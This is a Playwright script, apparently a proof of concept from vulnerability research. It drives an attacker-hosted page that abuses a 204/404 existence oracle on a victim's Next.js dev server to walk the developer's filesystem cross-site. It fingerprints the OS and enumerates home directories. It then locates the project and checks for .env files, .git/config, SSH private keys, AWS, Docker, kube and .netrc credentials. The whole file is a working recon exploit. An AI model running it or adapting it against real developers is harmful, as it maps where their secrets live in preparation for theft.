// Zero-knowledge recon: the attacker page starts knowing nothing about the
// victim except that a `next dev` server is listening, and walks the developer's
// filesystem purely through the 204/404 existence oracle.
const { chromium } = require('playwright-core');

(async () => {
  const browser = await chromium.launch({
    executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome',
    headless: true,
    args: ['--no-sandbox'],
  });
  const page = await browser.newPage();
  page.on('console', (m) => { if (!/Failed to load resource/.test(m.text())) console.log('  [page]', m.text()); });
  await page.goto('http://attacker.test:8899/oracle.html');

  const ask = (paths) => page.evaluate((p) => window.runOracle(p), paths);
  const hits = (r) => Object.entries(r).filter(([, v]) => v).map(([k]) => k);
  let probes = 0;
  const run = async (paths) => { probes += paths.length; return await ask(paths); };

  // Step 1 -- which OS / which home layout?
  console.log('STEP 1  platform fingerprint');
  let r = await run(['/etc/passwd', '/Users', '/home', '/proc/version', '/etc/debian_version', '/etc/alpine-release']);
  console.log('        ' + hits(r).join('  '));

  // Step 2 -- who is the developer? (guess common account names)
  console.log('STEP 2  enumerate home directories');
  const names = ['user', 'dev', 'root', 'ubuntu', 'admin', 'node', 'alice', 'bob', 'jenkins'];
  r = await run(names.map((n) => '/home/' + n));
  const homes = hits(r);
  console.log('        found: ' + homes.join('  '));

  // Step 3 -- where is the project checked out? (common parent dirs x common names)
  console.log('STEP 3  locate the project checkout');
  const parents = [];
  for (const h of homes) parents.push(h, h + '/src', h + '/code', h + '/projects', h + '/dev');
  r = await run(parents);
  const liveParents = hits(r);
  const guesses = [];
  for (const p of liveParents) for (const n of ['nextlab', 'app', 'web', 'frontend', 'site', 'my-app']) guesses.push(p + '/' + n + '/package.json');
  r = await run(guesses);
  const projects = hits(r).map((f) => f.replace(/\/package\.json$/, ''));
  console.log('        project root: ' + projects.join('  '));

  // Step 4 -- inventory the secrets present in that project.
  console.log('STEP 4  inventory sensitive files in the project');
  const sensitive = [];
  for (const proj of projects) {
    for (const f of ['.env', '.env.local', '.env.secret', '.env.production', '.git/config',
                     '.npmrc', 'next.config.js', 'middleware.js', 'proxy.ts', '.aws/credentials']) {
      sensitive.push(proj + '/' + f);
    }
  }
  r = await run(sensitive);
  console.log('        present: ' + hits(r).join('\n                 '));

  // Step 5 -- credentials outside the project.
  console.log('STEP 5  credential files in the developer home dir');
  const creds = [];
  for (const h of homes) {
    for (const f of ['.ssh/id_rsa', '.ssh/id_ed25519', '.aws/credentials', '.npmrc',
                     '.docker/config.json', '.kube/config', '.gitconfig', '.netrc']) {
      creds.push(h + '/' + f);
    }
  }
  r = await run(creds);
  console.log('        present: ' + (hits(r).join('\n                 ') || '(none)'));

  console.log(`\nTotal cross-site probes issued: ${probes}. No response body was ever read.`);
  await browser.close();
})();
